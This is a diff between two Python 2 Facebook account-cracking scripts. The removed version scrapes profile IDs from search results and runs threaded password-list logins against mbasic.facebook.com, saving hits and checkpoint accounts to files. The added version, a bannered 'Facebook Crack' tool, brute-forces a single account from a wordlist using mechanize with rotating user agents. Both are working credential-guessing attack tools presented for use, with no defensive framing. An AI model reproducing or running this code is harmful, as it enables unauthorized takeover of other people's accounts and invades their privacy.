@@ -1,95 +1,88 @@
-import requests,bs4,sys,os
-import requests,sys
-from multiprocessing.pool import ThreadPool
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
 
-class crack:
-	def __init__(self):
-		self.ada=[]
-		self.cp=[]
-		self.ko=0
-		try:
-			self.fl=open(raw_input("?: id list file: ")).read().splitlines()
-		except Exception as e:
-			print "!: %s"%e
-			crack()
-		print "+ example pass123,pass12345"
-		self.pwlist()
-		
-	def pwlist(self):
-		self.pw=raw_input("?: password list: ").split(",")
-		if len(self.pw) ==0:
-			self.pwlist()
-		else:
-			print "!: crack started..."
-			print "+: account found saved to: multiresult.txt"
-			print "+: account checkpoint saved to: checkpoint.txt"
-			ThreadPool(30).map(self.main,self.fl)
-			exit("\n+: finished.")
-		
-	def main(self,fl):
-		try:
-			for i in self.pw:
-				r=requests.Session()
-				r.get("https://mbasic.facebook.com/login")
-				r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
-				b=r.post("https://mbasic.facebook.com/login", data={"email":fl,"pass":i}).url
-				if "c_user" in r.cookies.get_dict():
-					self.ada.append("%s|%s"%(fl,i))
-					open("multiresult.txt","a+").write("%s|%s\n"%(fl,i))
-				if "checkpoint" in b:
-					self.cp.append("%s|%s"%(fl,i))
-					open("checkpoint.txt","a+").write("%s|%s\n"%(fl,i))
-			self.ko+=1
-			print "\r[Crack] %s/%s - found-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
-		except:
-			self.main(fl)
-			
-def search(fl,r,b):
-	open(fl,"a+")
-	b=bs4.BeautifulSoup(r.get(b).text,"html.parser")
-	for i in b.find_all("a",href=True):
-		print "\r[GET]: %s id..."%(len(open(fl).read().splitlines())),;sys.stdout.flush()
-		if "<img alt=" in str(i):
-			if "home.php" in str(i["href"]):
-				continue
-			else:
-				g=str(i["href"])
-				if "profile.php" in g:
-					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
-					if len (d) !=0:
-						pk="".join(d)
-						open(fl,"a+").write("%s\n"%(pk))
-				else:
-					d=bs4.re.findall("/(.*?)\?",g)
-					if len(d) !=0:
-						pk="".join(d)
-						open(fl,"a+").write("%s\n"%(pk))
-		if "Lihat Hasil Selanjutnya" in i.text:
-			search(fl,r,i["href"])
-	print "\n[+] finished."
-				
+import sys
+import mechanize
+import cookielib
+import random
 
-def dumpfl():
-	r=requests.Session()
-	r.get("https://mbasic.facebook.com/login")
-	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
-	r.post("https://mbasic.facebook.com/login", data={"email":raw_input("?: email: "),"pass":raw_input("?: passs: ")}).url
-	if "c_user" in r.cookies.get_dict():
-		fl=raw_input("?: filename: ")
-		s=raw_input("?: search query: ")
-		search(fl,r,"https://mbasic.facebook.com/search/people/?q="+s)
+
+
+
+email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+
+
+passwordlist = str(raw_input("Enter the wordlist name and path : "))
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+
+
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+def main():
+	global br
+	br = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
+	br.set_handle_robots(False)
+	br.set_handle_redirect(True)
+	br.set_cookiejar(cj)
+	br.set_handle_equiv(True)
+	br.set_handle_referer(True)
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+	welcome()
+	search()
+	print("Password does not exist in the wordlist")
+
 	
+	
+def brute(password):
+	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
+	sys.stdout.flush()
+	br.addheaders = [('User-agent', random.choice(useragents))]
+	site = br.open(login)
+	br.select_form(nr = 0)
+	br.form['email'] = email
+	br.form['pass'] = password
+	sub = br.submit()
+	log = sub.geturl()
+	if log != login and (not 'login_attempt' in log):
+			print("\n\n[+] Password Find = {}".format(password))
+			raw_input("ANY KEY to Exit....")
+			sys.exit(1)
+
+			
+def search():
+	global password
+	passwords = open(passwordlist,"r")
+	for password in passwords:
+		password = password.replace("\n","")
+		brute(password)
+
+		
+#welcome 
+def welcome():
+	wel = """
+
+        +=========================================+
+        |..........   Facebook Crack   ...........|
+        +-----------------------------------------+
+        |            #Author: Ha3MrX              | 
+        |	       Version 1.0                |
+ 	|   https://www.youtube.com/c/HA-MRX      |
+        +=========================================+
+        |..........  Facebook Cracker  ...........|
+        +-----------------------------------------+\n\n
+"""
+	total = open(passwordlist,"r")
+	total = total.readlines()
+	print wel 
+	print " [*] Account to crack : {}".format(email)
+	print " [*] Loaded :" , len(total), "passwords"
+	print " [*] Cracking, please wait ...\n\n"
+
+	
+if __name__ == '__main__':
+	main()
 
 
-while True:
-	print "[1] Dump id By Search Name"
-	print "[2] Crack\n"
-	r=raw_input("?: pilih: ")
-	if r=="":
-		os.system("clear")
-	elif r =="1":
-		dumpfl()
-	elif r=="2":
-		crack()
-	else:
-		print "!: wrong input"
